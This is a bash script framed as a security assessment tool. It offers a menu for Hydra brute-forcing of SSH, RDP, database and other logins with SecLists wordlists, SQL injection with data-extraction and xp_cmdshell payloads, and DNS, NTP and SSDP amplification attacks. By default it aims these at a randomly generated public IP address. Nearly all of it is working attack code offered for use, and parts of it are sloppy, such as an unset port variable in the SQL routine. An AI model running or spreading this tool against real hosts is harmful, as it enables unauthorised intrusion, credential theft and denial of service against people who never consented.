#!/bin/bash

# Tools to check and potentially install
tools=("nmap" "hydra" "curl" "hping3" "ntp"  "seclists")  #sudo apt install uuid-runtime dig, ntpq, 


# Log files
SUMMARY_LOG="/var/log/security_assessment.log"
DDOS_LOG="/var/log/security_assessment_ddos_attacks.log"
SQL_INJECTION_LOG="/var/log/security_assessment_sql_injection.log"

# Check for sudo privileges 
check_sudo() {
	[ "$EUID" -ne 0 ] && echo "Please run this script with sudo." && exit 1;	 
}

# Function to install necessary tools
install_tools() {
    for tool in "${tools[@]}"; do
        if command -v $tool > /dev/null; then
            continue
        fi

        # Special handling for seclists because it's not available as a package
        if [ "$tool" == "seclists" ]; then
            if [ -d "/opt/SecLists" ]; then
                echo "seclists directory /opt/SecLists already exists. Skipping installation."
                continue  # Skip to the next tool in the loop
            else
                echo "Cloning seclists from GitHub..."
                git clone https://github.com/danielmiessler/SecLists.git /opt/SecLists
                if [ $? -eq 0 ]; then
                    echo "seclists cloned successfully to /opt/SecLists."
                else
                    echo "Failed to clone seclists. Exiting."
                    exit 1
                fi
            fi
        else
            echo "$tool is not installed. Installing..."
            apt-get install "$tool" -y > /dev/null
            if [ $? -eq 0 ]; then
                echo "$tool installed successfully."
            else
                echo "Failed to install $tool. Exiting."
                exit 1
            fi
        fi
    done
}




# Initialize and get a valid IP address
get_ip() {
    local ip_regex='^([0-9]{1,3}\.){3}[0-9]{1,3}$'
    while true; do
        read -p "Enter the IP Address to target (press Enter for random, or type 'exit' to quit): " ip
        echo
        
        # Check for 'exit' or 'quit'
        [[ $ip == "exit" || $ip == "quit" ]] && exit 0

        # Check if the user pressed Enter without typing anything for random IP
        if [ -z "$ip" ]; then
            # Generate a random IP address, avoiding reserved IP ranges
            ip=$((RANDOM%223+1)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))
            echo "Random IP generated: $ip"
            echo
            break
        elif [[ $ip =~ $ip_regex ]]; then
            echo "Targeting user-specified IP: $ip"
            break
        else
            echo "Invalid IP address format. Please try again."
        fi
    done
}

#______________________________________________________________________________________________________________________________________-

# Function to choose custom service and port
hydra_custom_service_and_port() {
    display_common_ports
    echo "Enter the details for your custom service and port."
    declare -A valid_services=(
        [rdp]=3389
        [ssh]=22
        [telnet]=23
        [ftp]=21
        [ftps]=990
        [smb]=445
        [pop3]=110
        [imap]=143
        [smtp]=25
        [smtps]=465
        [mssql]=1433
        [oracle]=1521
        [mongodb]=27017
        [mysql]=3306
        [postgres]=5432
    )
    
    read -p "Enter service name (or press Enter for random, or type 'custom' to enter a custom service): " service_input
    service=$(echo $service_input | tr '[:upper:]' '[:lower:]') # Convert service to lowercase

    if [ -z "$service" ]; then
        # Get all keys (service names) from valid_services
        local services=(${!valid_services[@]})
        # Pick a random service key
        local random_key=${services[$RANDOM % ${#services[@]}]}
        service=$random_key
        port=${valid_services[$random_key]}
        echo "Random service and port selected: $service $port"
    elif [[ "$service" == "custom" ]]; then
        read -p "Enter custom service name: " service
        read -p "Enter custom port number: " port
        if ! [[ "$port" =~ ^[0-9]+$ ]] || [ "$port" -lt 1 ] || [ "$port" -gt 65535 ]; then
            echo "Invalid port. Please enter a number between 1 and 65535."
            return 1
        fi
        echo "Custom service $service on port."
    elif [[ -n "${valid_services[$service]}" ]]; then
        port=${valid_services[$service]}
        echo "Service $service on port $port selected."
    else
        echo "Invalid service name."
        #exit 1
        hydra_custom_service_and_port
    fi

    echo "Service $service selected on Port $port"
    echo
}

# Function to display common ports for reference
display_common_ports() {
    declare -A services=(
        [rdp]=3389
        [ssh]=22
        [telnet]=23
        [ftp]=21
        [ftps]=21
        [smb]=445
        [pop3]=110
        [imap]=143
        [smtp]=25
        [smtps]=465
        [mssql]=1433
        [oracle]=1521
        [mongodb]=27017
        [mysql]=3306
        [postgres]=5432
    )

    # Sort services by port number
    sorted_keys=$(for port in "${!services[@]}"; do echo $port ${services[$port]}; done | sort -k2 -n | awk '{print $1}')

    echo "Common services and their default ports for reference:"
    printf "%-15s | %s\n" "Service" "Port"
    printf "%-15s + %s\n" "---------------" "-----"

    for key in $sorted_keys; do
        service=$(echo $key | tr '[:upper:]' '[:lower:]') # convert to lowercase for "small caps" effect
        port=${services[$key]}
        printf "%-15s | %d\n" "$service" "$port"
    done

    echo "-----------------------"
}

# Function to choose wordlist
hydra_choose_wordlist() {
    echo -e "Choose the wordlist source:\n1) Searching for wordlist from seclist\n2) Please specify the custom wordlist paths."
    read -p "Choice: " wordlistChoice
    case "$wordlistChoice" in
        1)
            # Attempt to find wordlists in "SecLists"
            local user=$(find / -type f -path "*/SecLists/*/top-usernames-shortlist.txt" 2>/dev/null)
            local pass=$(find / -type f -path "*/SecLists/*/10-million-password-list-top-1000.txt" 2>/dev/null)

            # If not found in "SecLists", try "seclists"
            if [[ ! -f "$user" ]] || [[ ! -f "$pass" ]]; then
                echo "SecLists wordlists not found, trying seclists..."
                user=$(find / -type f -path "*/seclists/*/top-usernames-shortlist.txt" 2>/dev/null)
                pass=$(find / -type f -path "*/seclists/*/10-million-password-list-top-1000.txt" 2>/dev/null)
            fi

            # Final check if wordlists are found
            if [[ -f "$user" ]] && [[ -f "$pass" ]]; then
                echo "Using wordlists from found directory."
            else
                echo "No valid wordlists found. Please ensure the correct installation of SecLists."
                return 1  # Return an error status if no files are found
            fi
            ;;
        2)
            read -p "Enter the path for the username wordlist: " user
            read -p "Enter the path for the password wordlist: " pass
            if [[ ! -f "$user" ]] || [[ ! -f "$pass" ]]; then
                echo "One or both custom wordlist paths are invalid."
                hydra_choose_wordlist
            fi
            ;;
        *)
            echo "Invalid selection. Please try again." ; hydra_choose_wordlist;;
    esac
    echo
    echo "Proceeding with user list: $user"
    echo "Proceeding with password list: $pass"
}

# Function to execute Hydra and log results
confirm_and_execute_hydra() {  
    read -p "Do you wish to continue with the attack? (y/n): " confirm
    if [[ "$confirm" =~ ^[Yy]$ ]]; then
        echo "Proceeding with $service on port $port."
        local start_time=$(date +%s)

        # Initialize an empty variable to capture Hydra's output
        local hydra_output=""
        local success_count=0
        
        # Execute Hydra and capture its output
        while IFS= read -r line; do
            echo "$line"
            hydra_output+="$line"$'\n'  # Append each line of output to the variable
            
            # Check for successful login attempts and log each
            if [[ "$line" =~ login:\ +([^ ]+)\ +password:\ +([^ ]+) ]]; then
                ((success_count++))
                local login="${BASH_REMATCH[1]}"
                local password="${BASH_REMATCH[2]}"
                local timestamp=$(date "+%Y-%m-%d %H:%M:%S")
                local log_entry="$timestamp - Target IP: $ip:$port//$service Password found: $login/$password"
                
                # Echo log_entry to both terminal and log file
                echo "$log_entry" | tee -a /var/log/security_assessment_hydra.log
            fi
        done < <(hydra -L "$user" -P "$pass" "$ip" "$service" -s "$port" -t 4 -vV 2>&1)
        
        local end_time=$(date +%s)
        local time_taken=$((end_time - start_time))
        echo "Time taken: $time_taken seconds."
        
        # Set details based on success_count for the summary log
        local details
        if [ $success_count -eq 0 ]; then
            details="0 password found"
        else
            details="$success_count password(s) found"
        fi
                
        # Log the outcome as a summary        
        generate_log_hydra "$service" "$ip" "$details"
    else
        echo "Attack aborted by the user."
        exit
    fi
    echo "$details"
}

# Function to generate log
generate_log_hydra() {
    local attack_type=$1     
    local target_ip=$2        
    local timestamp=$(date "+%Y-%m-%d %H:%M:%S")
    local log_entry="$timestamp - Attack executed: Bruteforce, Target IP: $target_ip, Port: $port, Services: $service, Details: $details for $attack_type"

    echo "$log_entry" >> /var/log/security_assessment.log
}

# Main script to run bruteforce
run_hydra() {        
    get_ip
    hydra_custom_service_and_port
    hydra_choose_wordlist
    confirm_and_execute_hydra
}

#______________________________________________________________________________________________________________________________________-

# Function to perform and log SQL injection attempts
sql_perform_attack() {
    local attack_type=$1
    local target_url=$2
    local param=$3
    local payload=$4
    
    # Perform the attack and log the attempt
    local response=$(curl -s -o /dev/null -w "%{http_code}" --data-urlencode "${param}=${payload}" "${target_url}")
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    local log_message="$timestamp - Performing $attack_type on $target_url with payload: '$payload', Response: $response"

    # Display and log the output
    echo $log_message
    echo $log_message >> $SQL_INJECTION_LOG

    # Handle the response for logging and display
    local response_message
    case $response in
        404)
            response_message="$timestamp - Resource Not Found: The path does not exist."
            ;;
        200)
            response_message="$timestamp - Success: The request was successfully processed."
            ;;
        *)
            response_message="$timestamp - Response: $response - This response is not specifically handled."
            ;;
    esac
    echo $response_message
    echo $response_message >> $SQL_INJECTION_LOG
}

# Example usage within a script
run_sql() {
    get_ip
    local targets=("http://$ip:$port/index.php" "http://$ip:$port/login.php")
    local payloads=("' OR '1'='1'" "' OR 1=1--" "' UNION SELECT NULL, username, password FROM users--" "' EXEC xp_cmdshell('whoami')--")

    for target in "${targets[@]}"; do
        for payload in "${payloads[@]}"; do
            sql_perform_attack "Standard SQL Injection" $target "param" $payload
            sql_perform_attack "Data Extraction SQL Injection" $target "param" $payload
            sql_perform_attack "Command Execution SQL Injection" $target "param" $payload
        done
    done
	
    echo "$(date '+%Y-%m-%d %H:%M:%S') - Attack completed. Check the /var/log for details."
    echo
    echo "$(date '+%Y-%m-%d %H:%M:%S') - Attack executed: Sql Injection attack simulation completed on $ip" >> $SUMMARY_LOG
}

#______________________________________________________________________________________________________________________________________-



# Function to simulate a DDoS attack with descriptions for each port
ddos_run_attack() {
	local attack_type
    case $1 in
        1) # DNS Amplification
            attack_type="DNS Amplification"
            echo
			echo "Running $attack_type  attack simulation..."      
			for i in {1..10}; do
                dig @$ip txt $(uuidgen).maliciousdomain.com
                sleep 1
            done
            echo "$attack_type attack completed"
			echo "$(date '+%Y-%m-%d %H:%M:%S') - Attack executed: $attack_type attack simulation completed on $ip" >> $SUMMARY_LOG  
            exit
            ;;
        2) # NTP Reconnaissance/Reflection
            attack_type="NTP Reconnaissance/Reflection"
            echo
			echo "Running $attack_type  attack simulation..."
            ntpq -c rv $ip
            echo "$attack_type attack completed"
			echo "$(date '+%Y-%m-%d %H:%M:%S') - Attack executed: $attack_type attack simulation completed on $ip" >> $SUMMARY_LOG           
            exit
            ;;
        3) # SSDP Amplification
			attack_type="SSDP Amplification"
			echo
            echo "Running $attack_type  attack simulation..."
            SSDP_PAYLOAD=$(cat <<'EOF'
M-SEARCH * HTTP/1.1
HOST: 239.255.255.250:1900
MAN: "ssdp:discover"
MX: 1
ST: ssdp:all
EOF
            )
            echo -e "$SSDP_PAYLOAD" | hping3 --udp -p 1900 -2 $ip -d $(echo -e "$SSDP_PAYLOAD" | wc -c) -E /dev/stdin -c 1
            echo
            echo "$attack_type attack completed"
			echo "$(date '+%Y-%m-%d %H:%M:%S') - Attack executed: $attack_type attack simulation completed on $ip" >> $SUMMARY_LOG
            exit
            ;;
            

        *)
            echo "Invalid choice. Exiting."
            ;;
    esac
}

run_ddos() {
	get_ip 	
	echo "Select the attack simulation to run:"
	echo "1. DNS Amplification"
	echo "2. NTP Reconnaissance/Reflection"
	echo "3. SSDP Amplification"
	read -p "Choice: " choice

	ddos_run_attack $choice
}

# Main menu function
main_menu() {
    while true; do
        echo "Main Menu - Choose an option:"
        echo "1) Run Brute Force"
        echo "2) Denial of Service Attack"
        echo "3) SQL Injection"
        echo "4) Exit"
        echo
        read -p "Your choice: " choice
        echo
        case $choice in
            1) run_hydra;; #hydra
            2) run_ddos;; #dig, ntpq, hping
            3) run_sql;; #curl
            4) echo "Exiting script."; exit 0;;
            exit|quit) echo "Exiting script."; exit 0;; #exit or quit to end the script
            *) echo "Invalid selection. Please try again.";;
        esac
        echo "" # Add a new line for better readability before showing the menu again
    done
}

# Execute the main function
check_sudo
install_tools
main_menu
